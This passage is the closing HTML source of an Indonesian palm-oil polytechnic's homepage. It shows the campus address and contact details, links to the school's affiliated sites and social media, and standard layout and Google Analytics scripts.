                    <img src="img/clients/PT. Triputra Agro Persada.png" class="color-img img-responsive" alt="PT. Triputra Agro Persada.png">
                  </a>
                </div>
                          </div>
          </div>
        </div>
      </div>
    </div>
    <!-- CLIENT END -->
<!-- DEBUG-VIEW ENDED 1 APPPATH/Views/front/home.php -->

  <div class="pre-footer">
    <div class="container">
      <div class="row">
        <div class="col-md-3 col-sm-6 pre-footer-col align-footer">
          <h2>ALAMAT KAMPUS</h2>
          <address class="margin-bottom-20">Jl. Gapura No.8 Rawa Banteng Desa Cibuntu, Kecamatan Cibitung, Kabupaten Bekasi, Provinsi Jawa Barat, Indonesia. Kode Pos: 17520</address>
        </div>
        <div class="col-md-3 col-sm-6 pre-footer-col align-footer">
          <h2>KONTAK KAMPUS</h2>
          <address class="margin-bottom-20">
            <p>
              <i class="fa fa-phone"></i> Phone : (021)-82603550 (021)-29091338 <br />
              <i class="fa fa-whatsapp"></i> Whatsapp : <a href="https://web.whatsapp.com/send?phone=+6285213835168&amp;text=Halo, Saya ingin bertanya tentang Kampus Politeknik Kelapa Sawit Citra Widya Edukasi. Terimakasih." target="_blank">+6285213835168</a> <br />
              <i class="fa fa-envelope-o"></i> Email : <a href="mailto:info@cwe.ac.id">
                <email data-user="info" data-domain="cwe.ac.id"></email>
              </a> <br />
              <i class="fa fa-print"></i> Fax : (021) 8254970            </p>
          </address>
        </div>
        <div class="col-md-3 col-sm-6 pre-footer-col align-footer">
          <h2>WEB PENDAMPING</h2>
          <ul class="list-unstyled">
                          <li><a href="https://journal.poltekcwe.ac.id/" target="_blank">Jurnal Citra Widya Edukasi</a></li>
                          <li><a href="https://perpuscwe.poltekcwe.ac.id/" target="_blank">Perpustakaan CWE</a></li>
                          <li><a href="https://digilib.poltekcwe.ac.id/" target="_blank">Digilib Poltek CWE</a></li>
                          <li><a href="https://ujian.poltekcwe.ac.id/" target="_blank">Ujian Poltek CWE</a></li>
                          <li><a href="https://librarytugasakhir.poltekcwe.ac.id/" >Library Tugas Akhir Poltek CWE</a></li>
                      </ul>
        </div>
        <div class="col-md-3 col-sm-6 pre-footer-col text-center">
          <img class="img-footer" src="https://poltekcwe.ac.id/img/icon/logo-politeknik-kelapa-sawit-citra-widya-edukasi.png" alt="Logo Politeknik Kelapa Sawit Citra Widya Edukasi">        </div>
      </div>
    </div>
  </div>
  <div class="footer">
    <div class="container">
      <div class="row text-center">
        <div class="col padding-top-10 text-lg">
          2025 © Politeknik Kelapa Sawit Citra Widya Edukasi        </div>
        <div class="col padding-top-10">
          <ul class="social-footer list-unstyled list-inline">
            <li><a href="https://facebook.com/politekniksawit" target="_blank"><img src="https://poltekcwe.ac.id/img/icon/fb.png" alt="Facebook Politeknik Kelapa Sawit Citra Widya Edukasi"></a></li>
            <li><a href="https://twitter.com/politeknikCWE" target="_blank"><img src="https://poltekcwe.ac.id/img/icon/x%20twitterrs.png" alt="Twitter Politeknik Kelapa Sawit Citra Widya Edukasi"></a></li>
            <li><a href="https://www.instagram.com/poltekcwe/" target="_blank"><img src="https://poltekcwe.ac.id/img/icon/ig.png" alt="Instagram Politeknik Kelapa Sawit Citra Widya Edukasi"></a></li>
            <li><a href="https://www.youtube.com/channel/UCibIpbdY0_JnaTHTeeSBEfA/featured" target="_blank"><img src="https://poltekcwe.ac.id/img/icon/yt.png" alt="Youtube Politeknik Kelapa Sawit Citra Widya Edukasi"></a></li>
            <li><a href="https://www.tiktok.com/@poltekcwe?_t=8k5lvzXCUFe&_r=1" target="_blank"><img src="https://poltekcwe.ac.id/img/icon/tiktok.png" alt="Tiktok Politeknik Kelapa Sawit Citra Widya Edukasi"></a></li>
           
          </ul>
        </div>
      </div>
    </div>
  </div>

  <a href="https://web.whatsapp.com/send?phone=+6285213835168&amp;text=Halo, Saya ingin bertanya tentang Kampus Politeknik Kelapa Sawit Citra Widya Edukasi. Terimakasih." target="_blank" alt="Chat Politeknik Kelapa Sawit Citra Widya Edukasi"><div id="chatWA"></div></a>

  <script type="text/javascript">
    jQuery(document).ready(function() {
      Layout.init();
      Layout.initOWL();
      RevosliderInit.initRevoSlider();
      Layout.initTwitter();
      Layout.initFixHeaderWithPreHeader(); /* Switch On Header Fixing (only if you have pre-header) */
      Layout.initNavScrolling();
    });

    function topFunction() {
      document.body.scrollTop = 0;
      document.documentElement.scrollTop = 0;
    }
  </script>

  <!-- Global site tag (gtag.js) - Google Analytics PKS-CWE -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-24650081-1"></script>
    <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());
    
      gtag('config', 'UA-24650081-1');
    </script>
</body>

</html>
<!-- DEBUG-VIEW ENDED 2 APPPATH/Views/main.php -->
